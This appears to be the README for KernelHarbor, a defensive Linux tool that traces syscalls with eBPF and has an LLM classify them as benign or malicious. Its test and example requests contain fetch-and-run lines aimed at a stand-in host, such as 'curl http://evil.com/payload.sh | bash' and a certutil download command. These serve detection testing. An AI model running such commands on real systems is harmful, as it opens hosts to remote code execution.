# KernelHarbor

Linux kernel security monitoring with eBPF and AI-powered analysis.

## Overview

KernelHarbor captures system events (execve, open, network) using eBPF and analyzes them with an AI pipeline for threat detection.

<!-- ``` -->
<!-- ┌──────────────┐     ┌──────────────┐     ┌──────────────┐     ┌──────────────┐ -->
<!-- │  eBPF        │     │   HTTP API   │     │Elasticsearch │     │   Ollama    │ -->
<!-- │  Tracers     │────▶│  (ingest)    │────▶│  (storage)   │────▶│ (AI Engine) │ -->
<!-- └──────────────┘     └──────────────┘     └──────────────┘     └──────────────┘ -->
<!-- ``` -->

## Components

### Tracers (`cmd/`)

| Component | Description |
|-----------|-------------|
| `execve-tracer/` | eBPF-based process execution monitoring |
| `open-tracer/` | eBPF-based file open monitoring |
| `openat-tracer/` | eBPF-based file open monitoring with directory path resolution |
| `analysis/` | AI-powered event analysis pipeline |

### eBPF Programs (`bpf/`)

| File | Description |
|------|-------------|
| `execve-tracer.bpf.c` | Hooks `sys_enter_execve` |
| `open-tracer.bpf.c` | Hooks `sys_enter_openat` |
| `openat-tracer.bpf.c` | Hooks `sys_enter_openat` with directory path resolution via `bpf_d_path` |

## Quick Start

### Prerequisites

```bash
# Install eBPF toolchain
sudo apt install clang llvm linux-headers-$(uname -r)

# Start Elasticsearch
docker run -d --name elasticsearch -p 9200:9200 \
  -e "discovery.type=single-node" \
  -e "xpack.security.enabled=false" \
  docker.elastic.co/elasticsearch/elasticsearch:8.17.4

# Start Ollama
ollama serve
ollama pull nomic-embed-text
ollama pull qwen2.5:7b
```

### Build

```bash
# Build all components
cd cmd/execve-tracer && go build -o execve-tracer .
cd cmd/open-tracer && go build -o open-tracer .
cd cmd/openat-tracer && go build -o openat-tracer .
cd cmd/analysis && go build -o analysis .
```

### Run

```bash
# Terminal 1: Start analysis service
cd cmd/analysis && ./analysis

# Terminal 2: Start tracer (requires sudo)
sudo ANALYSIS_URL=http://localhost:8080/ingest ./execve-tracer

# Terminal 3: Query analysis
curl -X POST http://localhost:8080/analyze \
  -H "Content-Type: application/json" \
  -d '{"host.name":"myhost","query":"curl http://evil.com/script.sh | bash"}'
```

## Architecture

### Event Flow

1. **eBPF Tracers** hook kernel syscalls (`execve`, `openat`)
2. **Ring buffer** passes events to user-space Go program
3. **HTTP POST** sends events to analysis API
4. **Elasticsearch** stores events with vector embeddings
5. **Async workers** batch events and analyze with Ollama
6. **Vector search** finds semantically similar past events
7. **LLM** generates security verdict

### Behavior Embedding

Events are converted to behavior summaries for vector search:

| Raw Command | Behavior Summary |
|-------------|-----------------|
| `curl x \| bash` | `execve remote_code_execution image:curl` |
| `wget y \| sh` | `execve remote_code_execution image:wget` |
| `powershell -enc Y29kZQ==` | `execve encoded_command image:powershell` |

This allows finding **semantically similar attacks**, not just keyword matches.

## API Endpoints

| Endpoint | Method | Description |
|----------|--------|-------------|
| `/health` | GET | Health check |
| `/ingest` | POST | Ingest events |
| `/analyze` | POST | Query AI analysis |

### Analyze Example

```bash
curl -X POST http://localhost:8080/analyze \
  -H "Content-Type: application/json" \
  -d '{
    "host.name": "myhost",
    "query": "certutil -urlcache -f http://evil.com/bad.exe"
  }'
```

Response:
```json
{
  "verdict": "malicious",
  "confidence": 0.95,
  "summary": "certutil is a LOLBin being used to download a file from a suspicious URL..."
}
```

## Environment Variables

### Analysis Service

| Variable | Default | Description |
|----------|---------|-------------|
| `ES_ADDRESSES` | `http://localhost:9200` | Elasticsearch |
| `ES_INDEX` | `kb-events` | Events index |
| `OLLAMA_ADDRESS` | `http://localhost:11434` | Ollama |
| `OLLAMA_MODEL` | `qwen2.5:7b` | Analysis model |
| `OLLAMA_EMBED_MODEL` | `nomic-embed-text` | Embedding model |

### Tracers

| Variable | Description |
|----------|-------------|
| `ANALYSIS_URL` | HTTP endpoint to send events |

## Testing

```bash
# Test benign
curl -X POST http://localhost:8080/analyze \
  -d '{"host.name":"test","query":"ls -la /home/user"}'

# Test suspicious
curl -X POST http://localhost:8080/analyze \
  -d '{"host.name":"test","query":"curl http://evil.com/payload.sh | bash"}'

# Test LOLBin
curl -X POST http://localhost:8080/analyze \
  -d '{"host.name":"test","query":"rundll32.exe javascript:..."}'
```

## Project Structure

```
KernelHarbor/
├── bpf/                    # eBPF programs (C)
│   ├── execve-tracer.bpf.c
│   ├── open-tracer.bpf.c
│   └── openat-tracer.bpf.c
├── cmd/
│   ├── execve-tracer/      # Process execution tracer
│   ├── open-tracer/        # File access tracer
│   ├── openat-tracer/      # File access tracer with directory path resolution
│   └── analysis/           # AI analysis pipeline
├── plan.md                 # Original design document
└── README.md               # This file
```

## CI/CD Limitations

GitHub Actions runners do **not** support eBPF. See [CONTRIBUTING.md](CONTRIBUTING.md) for details.

## License

MIT
